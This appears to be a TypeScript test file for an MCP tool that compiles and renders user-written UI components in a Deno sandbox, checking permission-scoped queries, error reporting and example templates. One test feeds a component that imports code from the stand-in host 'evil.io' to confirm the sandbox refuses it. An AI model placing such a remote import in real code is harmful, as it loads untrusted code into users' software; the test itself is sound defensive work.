// Code components through MCP: compilation refusal, render test
// in the sandbox (Deno), examples. Requires DATABASE_URL and deno.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { client, owner, raw } from "./test-client";

after(() => setImmediate(() => process.exit(0)));

const SRC = `import { Badge } from "@ui/badge";
import { useQuery } from "@getrunbase/sdk";
export default function Count({ object, label }: { object: string; label: string }) {
  const { data } = useQuery({ object });
  return <Badge>{label} : {data.length}</Badge>;
}`;

test("page.*: test, examples", async () => {
  const ctx = await owner();
  const call = client(ctx);
  const rawCall = raw(ctx);

  const bad = await rawCall("page.test", {
    source: `import x from "https://evil.io/x.js"; export default () => x;`,
  });
  assert.ok(!bad.isError);
  assert.match(
    JSON.parse(bad.content[0]!.text).errors[0].text,
    /forbidden import/,
  );

  const ok = await call("page.test", {
    source: SRC,
    permissions: { objects: ["o1"] },
    props: { object: "o1", label: "Leads" },
    data: { o1: [{ id: "a" }, { id: "b" }] },
  });
  assert.deepEqual(ok.errors, []);
  assert.match(ok.html, /Leads.*2/);
  assert.deepEqual(ok.sdkCalls, [
    { call: { method: "query", args: { object: "o1" } } },
  ]);

  const denied = await call("page.test", {
    source: SRC,
    props: { object: "o2", label: "x" },
  });
  assert.match(denied.sdkCalls[0].denied, /object not allowed: o2/);

  const crash = await call("page.test", {
    source: `export default function C() { throw new Error("boum"); }`,
  });
  assert.match(crash.errors[0].text, /boum/);

  const { items: examples } = await call("page.examples");
  assert.deepEqual(
    examples.map((e: { name: string }) => e.name),
    ["crm", "kanban", "dashboard"],
  );
  assert.match((await call("page.guide")).guide, /@runbase\/kit/);
  const crm = await call("page.examples", { name: "crm" });
  assert.equal(crm.entry, "index.tsx");
  assert.ok(crm.files["components/deal-panel.tsx"]);
});
